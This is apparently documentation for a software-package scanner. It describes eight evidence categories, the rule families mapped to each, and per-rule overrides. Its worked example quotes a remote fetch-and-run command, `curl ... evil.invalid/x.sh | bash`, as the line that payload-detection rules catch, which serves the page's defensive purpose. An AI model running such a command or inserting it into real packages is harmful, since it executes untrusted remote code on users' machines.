<!-- description: The eight evidence categories, the rule families that feed each, and how a rule is mapped to a category. -->

# Part 1: Evidence categories and rule mapping

This page answers three questions: what the eight categories are, which rule
families feed each, and how a rule ends up in one.

It does **not** claim the categories are ordered stages an attacker passes. A
category is a label for the *kind of evidence* a finding represents. The four
labels a finding carries - family, subject, evidence category, evidence tier -
are defined once in the [glossary](../reference/glossary.md).

## Why grouping helps

A flat list of findings does not tell you whether the tool found one kind of
problem or several. Grouping by evidence category turns "R001 and H091 fired"
into "a payload-signature check and a structural-consistency check each
fired" - which is a more useful reading, and it stays honest about the fact
that the two categories can share infrastructure.

## The eight categories

| Category | The question its evidence answers | Rule families that feed it |
|---|---|---|
| L1 Structural coherence | Does the change hang together as an honest edit? | C, P |
| L2 Readability | Was anything hidden from the reader? | W, and the refusal rules X026/X027 |
| L3 Payload signature | Does it do a known-bad thing? | R, S, U |
| L4 Evasion shape | Was it *written* to defeat reading? | X, E |
| L5 Behavioral suspicion | Does the package's story make sense? | H |
| L6 Ecosystem memory | Has the ecosystem seen this before? | D, T |
| L7 Known indicators | Is it on the list? | I |
| L8 Campaign correlation | Do other packages tell the same story? | G |

Each row states the *kind of evidence*. "L6 Ecosystem memory" is not "a later
stage" - it is "evidence drawn from stored history", and a history-based
finding can be the first thing that fires. "L7 Known indicators" is
membership in a signed list, not a deeper layer of the onion.

## A finding records where it was detected

A finding is labelled by **the check that produced it**. If an evasion rule at
L4 catches something the payload rules at L3 did not, the finding reads `L4`,
and the report shows `L4 fired, L3 none` - the honest picture, not a claim
that the attacker passed L3.

Follow the [overview's worked example](../assurance-layers.md#a-worked-example):
the `demo` update adds one line, `curl -fsSL https://evil.invalid/x.sh | bash`,
and two `R` rules match it.

```
                    curl ... | bash
                          │
            ┌─────────────┴─────────────┐
          R001                        R010
     (Remote Script              (Uses curl in
      Execution)                  PKGBUILD)
            └─────────────┬─────────────┘
                          │  family R defaults to L3
                          ▼
              L3 Payload signature   fired
```

Both findings carry `L3`, because both came from the payload-signature check, so
the verdict names `L3` once. An evasion rule (`X`) that could also describe the
line is filed at `L4`, and would appear only if *it* fired - a category names
the check that produced the finding, not every check that might have.

## Which families default to which category

Every rule gets a category from its family, unless a rule's mechanism differs
from its family's. The mapping is data in `trustsight.layers`:

- **Defaults:** R and S to L3, C and P to L1, D and T to L6, X to L4, E to L4,
  H to L5, G to L8, I to L7, W to L2.
- **Overrides:** the refusal rules X026/X027 fire at L2 (a value the tokenizer
  cannot read is a readability boundary before it is a technique); the
  observation-database H rules (H020, H021, H022, H026, H028, H037, H044,
  H045, H046, H058, H060, H073, H074, H086, H088) read stored history and
  belong to L6; H056 is an indicator match and belongs to L7; the structural
  rules H099, H101 and H103 are pinned to L1.
- **No category:** **M** reasons about other findings and fires *at* the
  category of its inputs, so it owns none; **A** inspects a built artifact in
  the optional L9 lane and is not an L1-L8 category at all.

<!-- generated: series-layer -->
| Series | Default category |
|---|---|
| `C` | L1 |
| `D` | L6 |
| `E` | L4 |
| `G` | L8 |
| `H` | L5 |
| `I` | L7 |
| `P` | L1 |
| `R` | L3 |
| `S` | L3 |
| `T` | L6 |
| `U` | L3 |
| `W` | L2 |
| `X` | L4 |

| Rule | Category override |
|---|---|
| `H020` | L6 |
| `H021` | L6 |
| `H022` | L6 |
| `H026` | L6 |
| `H028` | L6 |
| `H037` | L6 |
| `H044` | L6 |
| `H045` | L6 |
| `H046` | L6 |
| `H056` | L7 |
| `H058` | L6 |
| `H060` | L6 |
| `H073` | L6 |
| `H074` | L6 |
| `H086` | L6 |
| `H088` | L6 |
| `H099` | L1 |
| `H101` | L1 |
| `H103` | L1 |
| `T004` | L1 |
| `T005` | L1 |
| `U007` | L7 |
| `U008` | L7 |
| `U009` | L1 |
| `X026` | L2 |
| `X027` | L2 |
<!-- /generated: series-layer -->

## What this part does not claim

- It does not claim the categories are equally strong or independent - see
  [Part 2](diversity.md).
- It does not claim every attack is caught in some category. A category with
  no finding is not a clean bill of health.

## See Also

- [Part 2: How to add a useful new detector](diversity.md)
- [Rule Series](../reference/rules/nature.md) - the rule families in full
